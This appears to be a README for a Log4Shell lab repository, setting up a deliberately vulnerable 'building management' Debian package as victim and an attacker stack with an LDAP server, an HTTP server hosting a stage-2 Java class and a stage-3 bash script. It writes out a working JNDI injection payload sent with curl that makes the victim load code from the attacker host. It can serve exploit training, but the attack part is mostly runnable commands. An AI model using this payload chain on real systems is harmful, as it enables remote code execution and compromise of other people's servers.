M75-LOG4J-VULNERABILITY
-----------------------

# Overview

![](./images/log4j-explained.webp)

# Project Structure

```
.
├── README.md
├── attacker                        # Attacker related files
│   ├── docker-compose.yml          # used to build and run the payload-generator, ldap server and http server containers
│   ├── http-dir                    # http server hosted directory
│   │   ├── Plugin.class            # Java class hosted by the http server ready for the victim (stage 2 payload)
│   │   └── fRitPo                  # Linux bash script (stage 3 payload)
│   ├── marshalsec                  # attacker ldap server
│   └── payload-generator           # dockerized payload generator (used to update jave source and compile it)
│       ├── Dockerfile              
│       └── Plugin.src.java         # stage 2 payload source code
├── images                          # README media
└── victim                          # Victim related files
    ├── Makefile                    # Helper script to build the debian package
    ├── buildingmgmt.1.0-2          # fake building management server/app source
    ├── buildingmgmt.1.0-2.deb      # distributable debian package ready for install
    └── log4shell-vulnerable-app    # log4j vulnerable app
```

### References
- [log4shell-dockerlab](https://javarepos.com/lib/ChoiSG-log4shell-dockerlab)

# Usage

## Victim

> Note: The victim must have Java version <=1.8.0_181

1. Download and install older version of Java.

    ```bash
    wget -O /tmp/openjdk-8-jre-headless.deb https://github.com/sintax1/M75-log4j-vuln/blob/master/victim/openjdk-8-jre-headless_8u144-b01-2_amd64.deb?raw=true
    sudo apt install -y /tmp/openjdk-8-jre-headless.deb
    ```

1. Download and install the vulnerable web app.
    ```bash
    sudo apt-get update
    wget -O /tmp/buildingmgmt.deb https://github.com/sintax1/M75-log4j-vuln/blob/master/victim/buildingmgmt_1.0-2_all.deb?raw=true
    sudo apt install -y /tmp/buildingmgmt.deb
    ```

## Attacker

1. clone the source repo onto the attacker VM.

    ```
    git clone https://github.com/sintax1/M75-log4j-vuln.git
    ```

2. Update the configuration (.env)

    ```
    #.env

    export VICTIM_TO_ATTACKER_HTTP_PORT=8081
    export VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME=10.5.0.4
    export ATTACKER_HTTP_SERVER_PORT=8081
    export ATTACKER_HTTP_DIR=./http-dir
    ```

2. Build and run the docker containers.

    > Note: This requires [docker and docker compose](#installing-docker-and-docker-compose) on the attacker VM

    ```
    cd M75-log4j-vuln/attacker
    docker compose up -d
    ```

3. Launch the exploit.

    ```
    VICTIM=10.5.0.5
    VICTIM_VULN_PORT=8080
    ATTACKER=10.5.0.4
    LDAP_PORT=1389
    STAGE2_JAVA_CLASS_NAME=Plugin
    curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:${LDAP_PORT}/${STAGE2_JAVA_CLASS_NAME}}'
    ```
curl 10.5.0.5:8080 -H 'X-Api-Version: ${jndi:ldap://10.5.0.4:1389/Plugin}'

# Development

## Attacker


## Victim

### Build Java stage 2 payload

> Note: Requires gradle java builder

    ```bash
    cd victim/log4shell-vulnerable-app; gradle bootJar --no-daemon
    cp build/libs/*.jar ../buildingmgmt.1.0-2/building-management.jar
    ```

### Build .deb package

    ```bash
    # Use docker to build so you don't need to install debian build tools locally
    git clone https://github.com/tsaarni/docker-deb-builder.git

    # Build the build cotnainer
    cd docker-deb-builder
    docker build -t docker-deb-builder:20.04 -f Dockerfile-ubuntu-20.04 .

    # create the output dir for the .deb pkg
    mkdir output

    # Build
    ./build -i docker-deb-builder:20.04 -o output <path to debian source>
    ```

### Transfer to the victim and install

    ```bash
    apt install buildingmgmt.*.deb
    ```

# Installing docker and docker compose
```bash
sudo apt update
sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
apt-cache policy docker-ce
sudo apt install -y docker-ce

mkdir -p ~/.docker/cli-plugins/
curl -SL https://github.com/docker/compose/releases/download/v2.2.3/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose
chmod +x ~/.docker/cli-plugins/docker-compose
sudo chown $USER /var/run/docker.sock

```